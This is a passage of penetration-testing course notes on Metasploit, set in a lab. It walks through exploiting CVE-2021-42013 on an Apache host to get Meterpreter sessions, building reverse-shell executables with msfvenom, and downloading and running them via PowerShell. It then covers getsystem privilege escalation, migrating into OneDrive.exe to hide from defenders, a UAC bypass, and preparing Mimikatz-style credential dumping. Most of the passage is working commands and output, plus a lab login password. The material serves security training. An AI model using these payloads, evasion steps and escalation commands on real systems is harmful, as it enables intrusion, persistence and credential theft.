msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
payload => linux/x64/meterpreter_reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...

Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.119.2    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
...
```
+ Above shows that there are various Meterpreter payloads compatible for the currently activated exploit module

At this point, we should note that all Meterpreter payloads are staged
+ However, the output of **show payloads** contains staged and non-staged payloads
+ The difference between those two types is how the Meterpreter payload is transferred to the target machine
+ The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components
+ Loading these components over the network creates quite some traffic and may alert defensive mechanisms
+ In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy
+ For the rest of the Module, we'll use the non-staged version whenever we use a Meterpreter payload

After selecting the 64-bit non-staged version of _`meterpreter_reverse_tcp`_ as payload, we can review its options
+ For this particular payload, the same options apply as for the previous payloads we used

Now, let's run the exploit module with our Meterpreter payload and once we obtain a Meterpreter command prompt, we'll display its available commands by entering **help**:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_tcp command payload
[*] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:20 -0400
[!] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target


meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    ...
    channel                   Displays information or control active channels
    close                     Closes a channel
    ...
    info                      Displays information about a Post module
    ...
    load                      Load one or more meterpreter extensions
    ...
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    ...

...

Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    shell         Drop into a system command shell
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS
```
+ A few moments after the exploit module is launched, we'll get a Meterpreter command prompt as shown
+ The commands of Meterpreter are divided into categories such as _System Commands_, _Networking Commands_, and _File system Commands_

Let's get familiar with some of the Meterpreter commands
+ We'll start gathering information by entering **`sysinfo`** and **`getuid`**
```
meterpreter > sysinfo
Computer     : 172.29.0.2
OS           : Ubuntu 20.04 (Linux 5.4.0-122-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

meterpreter > getuid
Server username: daemon
```
+ The commands provide us with information about the target computer, operating system, and the current user

As we've already learned, Metasploit uses sessions to manage access to different machines
+ When Metasploit interacts with a system within a session, it uses a concept named _channels_
+ Let's start an interactive shell by entering **shell**, execute a command in the context of a channel, and background the channel the shell runs in
+ To background a channel, we can use Ctrl+z
```
meterpreter > shell
Process 194 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N]  y

meterpreter > 
```

Next, we'll start a second interactive shell, execute a command, and also, background the channel
```
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
```

Now, let's list all active channels and interact with channel 1 again
+ To list all active channels, we can enter **`channel -l`** and to interact with one, we can use **`channel -i`** and the channel ID as argument
```
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter > channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
+ Above shows we can execute commands in the context of channel 1 again
+ Using channels will help us tremendously to manage system access and perform post-exploitation operations

Next, let's use the _download_ and _upload_ commands from the category _File system Commands_ to transfer files to and from the system
+ For this, let's review the commands of this category first:
```
meterpreter > help
...
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory
...   
```
+ Above shows us various commands that we can use to upload, download, or manage files on the local and target system
+ Commands with "`l`" as prefix operate on the local system; in our case our Kali VM
+ For example, we can use these commands to change the directory to where we want to download or upload files

Let's download **/etc/passwd** from the target machine to our Kali system
+ For this, we'll change the local directory on our Kali machine to **/home/kali/Downloads** first
+ Then, we'll enter the **download** command and **/etc/passwd** as argument:
```
meterpreter > lpwd
/home/kali

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
[*] download   : /etc/passwd -> /home/kali/Downloads/passwd

meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
```
+ Above shows that we could successfully download **/etc/passwd** to our local machine

Next, let's assume we want to run _unix-privesc-check_ like in a previous Module to find potential privilege escalation vectors
+ Let's upload the file to **/tmp** on the target system
```
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/
[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check

meterpreter > ls /tmp
Listing: /tmp
=============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
...
100644/rw-r--r--  36801    fil   2022-08-08 05:26:15 -0400  unix-privesc-check
```
+ Above shows that we successfully uploaded _unix-privesc-check_ to the target machine
+ If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like "`\\`"

So far, we've used the _linux/x64/meterpreter_reverse_tcp_ payload in this section to explore various features of Meterpreter
+ Before we head into the next section, let's use another 64-bit Linux Meterpreter payload
+ Therefore, we exit the current session and use **show payloads** in the context of the exploit module again:
```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.50.16 - Meterpreter session 4 closed.  Reason: User exit

msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   ...
   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   ...
```
+ Above shows that index 10 is _payload/linux/x64/meterpreter_reverse_https_. Instead of a raw TCP connection, this payload uses HTTPS to establish the connection and communication between the infected target and our Kali machine
+ As the traffic itself is encrypted with SSL/TLS, defenders will only obtain information about HTTPS requests
+ Without further defensive techniques and technologies, they will be unlikely to decipher the Meterpreter communication

Let's select this payload and display its options
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
payload => linux/x64/meterpreter_reverse_https

msf6 exploit(multi/http/apache_normalize_path_rce) > show options

...

Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.119.2    yes       The local listener hostname
   LPORT  4444             yes       The local listener port
   LURI                    no        The HTTP Path

...
```
+ Above shows there is an additional option for this payload named _LURI_
+ This option can be used to leverage a single listener on one port capable of handling different requests based on the path in this option and provide a logical separation
+ If we leave this option blank, Metasploit just uses **`/`** as path

Now, let's launch the exploit module by entering **run** without setting a value to the _LURI_ option:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started HTTPS reverse handler on https://192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_https command payload
[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw) Redirecting stageless connection from /5VnUXDPXWg8tIisgT9LKKgwTqHpOmN8f7XNCTWkhcIUx8BfEHpEp4kLUgOa_JWrqyM8EB with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69'
...
[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw) Attaching orphaned/stageless session...
[*] Meterpreter session 5 opened (192.168.119.4:4444 -> 127.0.0.1) at 2022-08-08 06:12:42 -0400
[!] This exploit may require manual cleanup of '/tmp/IkXnnbYT' on the target

meterpreter > 
```
+ Above shows that the payload provided us with a Meterpreter session

The output displays the handling of various requests until the Meterpreter session is established
+ If a defender monitors the payload's communication, it seems like regular HTTPS traffic
+ Furthermore, if they would check the address of the communication endpoint (our Kali machine in this example), they'd only get a _Not found_ page with HTTP code 404 in the browser

In a penetration test, we can use this payload to improve our chances of bypassing security technology and defenders
+ However, as Metasploit is one of the most well-known exploit frameworks, the detection rates of Meterpreter payloads are quite high by security technologies such as antivirus solutions
+ Therefore, we should always attempt to obtain an initial foothold with a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies
+ However, this kind of obfuscation is outside of the scope of this Module
### Executable Payload
Metasploit also provides the functionality to export payloads into various file types and formats such as Windows and Linux binaries, webshells, and more
+ Metasploit contains _msfvenom_ as a standalone tool to generate these payloads
+ It provides standardized command line options and includes various techniques to customize payloads

To get familiar with msfvenom, we'll first create a malicious Windows binary starting a raw TCP reverse shell
+ Let's begin by listing all payloads with **payloads** as argument for **-l**
+ In addition, we use **--platform** to specify the platform for the payload and **--arch** for the architecture
```
msfvenom -l payloads --platform windows --arch x64
```
+ Above shows that we can choose between a staged and non-staged payload
+ For this example, we'll use the non-staged payload first
+ Can specify `php` as the arch for a php webshell 

Now, let's use the **-p** flag to set the payload, set **LHOST** and **LPORT** to assign the host and port for the reverse connection, **-f** to set the output format (**exe** in this case), and **-o** to specify the output file name:
+ Usage:
```
msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -f <OUTPUT_FORMAT> -o <FILE_NAME>
```
+ Example:
```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: nonstaged.exe
```

Now that we have created the malicious binary file, let's use it 
+ For this, we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user _justin_ and password _`SuperS3cure1337#`_
+ Once we've connected over RDP, we can start PowerShell to transfer the file and execute it 
```
PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe

PS C:\Users\justin> .\nonstaged.exe
```

Once we executed the binary file, we'll receive an incoming reverse shell on our Netcat listener:
```
kali@kali:~$ nc -nvlp 443 
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50822
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\justin>
```

Now, let's use a staged payload to do the same:
+ For this, we'll again use msfvenom to create a Windows binary with a staged TCP reverse shell payload
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

Now we download and execute **staged.exe**
+ We'll also start the Netcat listener again
```
kali@kali:~$ nc -nvlp 443                                                                                
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
whoami
```
+ While we received an incoming connection, we cannot execute any commands through it 
+ This is because Netcat doesn't know how to handle a staged payload

To get a functional interactive command prompt, we can use Metasploit's _multi/handler_ module, which works for the majority of staged, non-staged, and more advanced payloads
+ Let's use this module to receive the incoming connection from **staged.exe**

In Metasploit, let's select the module with **use**
+ Then, we have to specify the payload of the incoming connection
+ In our case, this is _windows/x64/shell/reverse_tcp_ 
+ In addition, we have to set the options for the payload
+ We enter the IP of our Kali machine as argument for **LHOST** and port 443 as argument for **LPORT** 
+ Finally, we can enter **run** to launch the module and set up the listener:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf6 exploit(multi/handler) > show options
...
Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(multi/handler) > set LHOST 192.168.119.2
LHOST => 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.119.2:443 
```

Once our listener is running on port 443, we can start **staged.exe** again on BRUTE2
+ Our Metasploit multi/handler receives the incoming staged payload and provides us with an interactive reverse shell in the context of a session:
```
[*] Started reverse TCP handler on 192.168.119.2:443 
[*] Sending stage (336 bytes) to 192.168.50.202
[*] Command shell session 6 opened (192.168.119.2:443 -> 192.168.50.202:50838) at 2022-08-01 10:18:13 -0400


Shell Banner:
Microsoft Windows [Version 10.0.20348.169]
-----
          

C:\Users\justin> whoami
whoami
brute2\justin
```

We received the staged reverse shell and Metasploit started a session for us to use
+ For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat in order for the payload to work

Using _run_ without any arguments will block the command prompt until execution finishes or we background the session
+ As we've learned before, we can use _run -j_ to start the listener in the background, allowing us to continue other work while we wait for the connection
+ We can use the _jobs_ command to get a list of all currently active jobs, such as active listeners waiting for connections

Let's exit our session and restart the listener with **run -j**
+ Then, we'll list the currently active jobs using **jobs** 
+ Once we execute **staged.exe** again, Metasploit notifies us that a new session was created 
```
C:\Users\justin> exit
exit

[*] 192.168.50.202 - Command shell session 6 closed.  Reason: User exit
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.119.2:443 

msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                        Payload opts
  --  ----                    -------                        ------------
  1   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://192.168.119.2:443

msf6 exploit(multi/handler) > 
[*] Sending stage (336 bytes) to 192.168.50.202
[*] Command shell session 7 opened (192.168.119.2:443 -> 192.168.50.202:50839) at 2022-08-01 10:26:02 -0400
```

As Metasploit created a new session for the incoming connection, we could now again interact with it with **sessions -i** and the session ID as argument 

We can use the generated executable payloads from msfvenom in various situations during a penetration test
+ First, we can use them to create executable file types such as PowerShell scripts, Windows executables, or Linux executable files to transfer them to a target and start a reverse shell
+ Next, we can create malicious files such as web shells to exploit web application vulnerabilities. 
+ Finally, we can also use the generated files from msfvenom as part of a client-side attack

In this section, we explored executable payloads generated with msfvenom
+ We got familiar with how we can use msfvenom to generate executable files containing these payloads and how to set up multi/handler as listener for staged and non-staged payloads alike
+ Using msfvenom to generate executable files with various payloads and in numerous file types will assist us greatly in penetration tests

## Performing Post-Exploitation with Metasploit
Once we gain access to a target machine, we can move on to the post-exploitation phase where we gather information, take steps to maintain our access, pivot to other machines, elevate our privileges, and so on
+ The Metasploit Framework has several interesting post-exploitation features that can simplify many aspects of the process
+ In addition to the built-in Meterpreter commands, a number of post-exploitation MSF modules take an active session as an argument and perform post-exploitation operations on them

### Core Meterpreter Post-Exploitation Features
In previous sections, we used the Meterpreter payload to navigate the file system, obtain information about the target system, and transfer files to and from the machine
+ Apart from the commands we already used, Meterpreter contains numerous post-exploitation features

We should note that the Linux Meterpreter payload contains fewer post-exploitation features than the Windows one
+ Therefore, we'll explore these features on the Windows target `ITWK01`
+ Let's assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system

To begin, we'll create an executable Windows binary with msfvenom containing a non-staged Meterpreter payload and name it **`met.exe`**:
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```

After we set the payload and its options, we launch the previously activated multi/handler module in Metasploit:
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

Next, we start a Python3 web server to serve **met.exe**
+ Then, we connect to the bind shell on port 4444 on ITWK01
+ Once connected, we can download **met.exe** with PowerShell and start the Windows binary
```
kali@kali:~$ nc 192.168.50.223 4444
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe

PS C:\Users\dave> .\met.exe
.\met.exe

PS C:\Users\dave>
```

Once the Windows binary is executed, Metasploit notifies us that it opened a new session
+ Now that we have an active Meterpreter session on a Windows target we can start exploring post-exploitation commands and features
+ The first post-exploitation command we use is **`idletime`**
+ It displays the time for which a user has been idle
+ After obtaining basic information about the current user and operating system, this should be one of our first commands as it indicates if the target machine is currently in use or not:
```
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

The output states that the user hasn't been interacting with the system for 9 minutes and 53 seconds, suggesting the user may have stepped away from their computer
+ If the result of the idletime command indicates that the user is away, we can take this as an opportunity to execute programs or commands which may display a command-line window such as CMD or PowerShell for a brief moment

For several post-exploitation features, we need administrative privileges to execute them
+ Metasploit contains the command _getsystem_, which attempts to automatically elevate our permissions to _NT AUTHORITY\SYSTEM_
+ It uses various techniques using named pipe impersonation and token duplication
+ In the default settings, _getsystem_ uses all available techniques (shown in the help menu) attempting to leverage _SeImpersonatePrivilege_ and _SeDebugPrivilege_

Before we execute _getsystem_, let's start an interactive shell and confirm that our user has one of those two privileges assigned:
```
meterpreter > shell
...

C:\Users\luiza> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...

C:\Users\luiza> exit
exit
```
+ Above shows that the user _luiza_ has _SeImpersonatePrivilege_ assigned
+ Now, let's use **getsystem** to attempt to elevate our privileges
```
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
+ Above shows that `getsystem` successfully elevated our privileges to NT AUTHORITY\SYSTEM by using _Named Pipe Impersonation (PrintSpooler variant)_ as we did manually in the _Windows Privilege Escalation_ Module

Another important post-exploitation feature is _migrate_
+ When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or execute our payload
+ If the victim closes that process, our access to the machine is closed as well
+ In addition, depending on how the Windows binary file containing the Meterpreter payload is named, the process name may be suspicious if a defender is searching through the process list
+ We can use migrate to move the execution of our Meterpreter payload to a different process

Let's view all running processes by entering **`ps`** in the Meterpreter command prompt
```
meterpreter > ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 2552   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
... 
 8052   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
```
+ Above shows that the process _met.exe_ has the process ID 2552
+ The name and path will easily make the process stand out to a defender reviewing the process list
+ The output shows that _offsec_ started a process related to _OneDrive_ with process ID 8052
+ If our payload runs within this process, it is far less likely to be detected by reviewing the process list

We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level than that of our current process
+ In the context of this example, we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are plentiful

Let's migrate our current process to _OneDrive.exe_ of the user _offsec_ by entering **migrate** and the process ID we want to migrate to:
+ Usage
```
migrate <ID>
```
+ Example:
```
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfully.

meterpreter > ps


Process List
============

 PID   PPID  Name                         Arch  Session  User                Path
 ---   ----  ----                         ----  -------  ----                ----
...
 2440   668   svchost.exe
 2472   668   svchost.exe
 2496   668   svchost.exe
 2568   668   svchost.exe
 2624   668   spoolsv.exe
 2660   668   svchost.exe
 2784   668   svchost.exe
 2928   668   svchost.exe
...
```

We successfully migrated our process to the OneDrive process
+ When reviewing the process list, we'll find our original process, _met.exe_ with ID 2552, does not exist anymore
+ Furthermore, we'll notice that the _ps_ output contains less information than before
+ The reason for this is that we are now running in the context of the process with the ID 8052 and therefore, as user _offsec_
```
eterpreter > getuid
Server username: ITWK01\offsec
```

Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the _execute_ Meterpreter command
+ This command provides the ability to create a new process by specifying a command or program

To demonstrate this, let's start a hidden Notepad process and migrate to it as user _offsec_
+ For this, we use **execute** with **-H** to create the process hidden from view and _notepad_ as argument for **-f** to specify the command or program to run
+ Then, we migrate to the newly spawned process
+ Usage:
```
execute -H -f notepad
migrate <ID>
```
+ We then migrate to that new notepad process 
+ Since we used the option **-H**, the Notepad process was spawned without any visual representation
+ However, the process is still listed in the process list of applications such as the task manager

Meterpreter offers a variety of other interesting post-exploitation modules such as _hashdump_, which dumps the contents of the SAM database or _screenshare_, which displays the target machine's desktop in real-time
+ While these Meterpreter features are quite powerful, Metasploit contains numerous post-exploitation modules that extend the basic post-exploitation features we explored in this section

### Post-Exploitation Modules
In addition to native commands and actions in the core functions of Meterpreter, there are several post-exploitation modules we can deploy against an active session

Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell
+ But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass _User Account Control_ (UAC)

In the previous section, we migrated our Meterpreter shell to a _OneDrive.exe_ process that is running at (presumably) medium integrity
+ For this section, let's repeat the steps from the previous section and then bypass UAC with a Metasploit post-exploitation module to obtain a session in the context of a high integrity level process

As before, we connect to the bind shell on port 4444 on ITWK01, download and execute **met.exe**, and enter **getsystem** to elevate our privileges
+ Then, we use **ps** to identify the process ID of _OneDrive.exe_, and **migrate** to it:
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > ps

Process List
============

 PID    PPID  Name                         Arch  Session  User                          Path
 ---    ----  ----                         ----  -------  ----                          ----
...
 8044   3912  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...

meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.

meterpreter > getuid
Server username: ITWK01\offsec
```
+ Above shows that we are now running in the context of _offsec_ again
+ While this is an administrative account, UAC prevents us from performing administrative operations as we learned in previous Modules
+ Before we attempt to bypass UAC, let's confirm that the current process has the integrity level _Medium_ 

To display the integrity level of a process, we can use tools such as _Process Explorer_ or third-party PowerShell modules such as _NtObjectManager_ 
+ Let's assume the latter is already installed on the system

Once we import the module with _Import-Module_, we can use _Get-NtTokenIntegrityLevel_ to display the integrity level of the current process by retrieving and reviewing the assigned access token
+ See usage with a meterpreter shell:
```
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```
+ Example:
```
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```
+ Above shows that we are currently performing operations in the context of integrity level _Medium_
+ Next, let's background the currently active channel and session to search for and leverage UAC post-exploitation modules
```
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...
```

Now let's **search** for UAC bypass modules
```
search UAC
```
+ Example output:
```
Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
-   ----                                                   ---------------  ----       -----  -----------
   0   post/windows/manage/sticky_keys                                         normal     No     Sticky Keys Persistance Module
   1   exploit/windows/local/cve_2022_26904_superprofile      2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
   2   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   3   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
   ...
   11  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   12  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   ...
```

The search yields quite a few results
+ One very effective UAC bypass on modern Windows systems is _exploit/windows/local/bypassuac_sdclt_, which targets the Microsoft binary **sdclt.exe**
+ This binary can be abused to bypass UAC by spawning a process with integrity level _High_
+ Usage:
```
use exploit/windows/local/bypassuac_sdclt
```

To use the module, we'll activate it and set the _SESSION_ and _LHOST_ options as shown in the following listing
+ Setting the _SESSION_ for post-exploitation modules allows us to directly execute the exploit on the active session
+ Then, we can enter **run** to launch the module
+ Example:
```
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/local/bypassuac_sdclt) > show options

Module options (exploit/windows/local/bypassuac_sdclt):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PAYLOAD_NAME                   no        The filename to use for the payload binary (%RAND% by default).
   SESSION                        yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at 2022-08-04 09:03:54 -0400
[*] Registry Changes Removed

meterpreter > 
```
+ Above shows that our UAC bypass post-exploitation module created a new Meterpreter session for us

Can check the integrity level of the process as we did before:
```
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High
```
+ Above shows that the process our payload runs in has the integrity level _High_ and therefore we have successfully bypassed UAC

Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the **load** command

One great example of this is _Kiwi_, which is a Meterpreter extension providing the capabilities of _Mimikatz_
+ Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute **met.exe** as user _luiza_ in the bind shell, and enter **getsystem**
```
msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https

msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.119.4:443
